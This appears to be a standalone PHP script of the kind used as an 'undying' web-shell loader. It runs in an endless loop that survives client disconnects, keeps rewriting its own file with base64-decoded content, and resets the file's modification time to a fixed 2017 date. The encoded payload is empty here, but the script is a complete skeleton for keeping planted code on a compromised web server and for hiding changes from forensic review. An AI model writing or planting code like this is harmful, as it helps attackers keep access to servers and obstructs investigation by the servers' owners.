<?php 
set_time_limit(0);
ignore_user_abort(1);
while(1){
file_put_contents(__FILE__,base64_decode(''));
touch(__FILE__,mktime(20,15,1,11,28,2017));
usleep(100);
}
?>
